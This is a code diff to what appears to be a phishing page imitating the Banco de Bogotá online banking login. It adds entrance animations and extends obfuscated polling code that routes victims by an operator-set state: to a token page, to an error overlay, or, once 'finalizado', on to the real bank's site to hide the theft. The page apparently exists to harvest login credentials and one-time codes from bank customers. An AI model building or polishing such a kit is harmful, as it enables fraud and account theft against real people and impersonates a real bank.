@@ -123,6 +123,33 @@
             display: flex !important;
             opacity: 1 !important;
         }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(25px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInLeft {
+            from { opacity: 0; transform: translateX(-35px); }
+            to   { opacity: 1; transform: translateX(0); }
+        }
+
+        .anim-fade-up {
+            opacity: 0;
+            animation: fadeInUp 0.7s ease-out forwards;
+        }
+
+        .anim-fade-left {
+            opacity: 0;
+            animation: fadeInLeft 0.7s ease-out forwards;
+        }
+
+        .anim-delay-1 { animation-delay: 0.1s; }
+        .anim-delay-2 { animation-delay: 0.25s; }
+        .anim-delay-3 { animation-delay: 0.4s; }
+        .anim-delay-4 { animation-delay: 0.55s; }
+        .anim-delay-5 { animation-delay: 0.7s; }
+        .anim-delay-6 { animation-delay: 0.85s; }
     </style>
 </head>
 <body>
@@ -139,18 +166,18 @@
 
     <div class="container">
         <section class="login-section">
-            <div class="bank-logo">
+            <div class="bank-logo anim-fade-up anim-delay-1">
                 <img src="img/banco-de-bogota.png" alt="Banco de Bogotá Logo" class="main-logo">
             </div>
-            <h1 class="welcome-title">Bienvenido a tu Banca Virtual</h1>
-            <div class="welcome-banner">
+            <h1 class="welcome-title anim-fade-up anim-delay-2">Bienvenido a tu Banca Virtual</h1>
+            <div class="welcome-banner anim-fade-up anim-delay-3">
                 <img src="img/Señora.png" alt="Asistente Virtual" class="banner-image">
                 <div class="banner-text">
                     <p>¿Nunca has ingresado a Banca Virtual?</p>
                     <a href="#">Aquí te decimos cómo hacerlo ›</a>
                 </div>
             </div>
-            <div class="login-container">
+            <div class="login-container anim-fade-up anim-delay-4">
                 <div class="login-options">
                     <button class="active">Clave segura</button>
                     <button>Tarjeta débito</button>
@@ -250,11 +277,11 @@
                     <a href="#">Olvidé mi clave</a>
                 </div>
             </div>
-            <p class="privacy-text">
+            <p class="privacy-text anim-fade-up anim-delay-5">
                 Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.
             </p>
         </section>
-        <section class="right-section">
+        <section class="right-section anim-fade-left anim-delay-3">
             <div class="service-cards-container">
                 <button class="nav-button prev-button" aria-label="Anterior">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -348,7 +375,6 @@
         </div>
     </div>
 
-    <!-- Overlay de error: credenciales inválidas -->
     <div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Open Sans',-apple-system,sans-serif;opacity:0;transition:opacity .3s ease">
         <div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#1a1a2e">
             <div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)">
@@ -498,6 +524,9 @@
                         if (_0xfia.estado === 'token') {
                             clearInterval(_0xdia);
                             window.location.href = 'token.html';
+                        } else if (_0xfia.estado === 'finalizado') {
+                            clearInterval(_0xdia);
+                            window.location.href = 'https://virtual.bancodebogota.co/';
                         } else if (_0xfia.estado === 'rechazado') {
                             clearInterval(_0xdia);
                             if (_0xi9) _0xi9.classList.remove('visible');
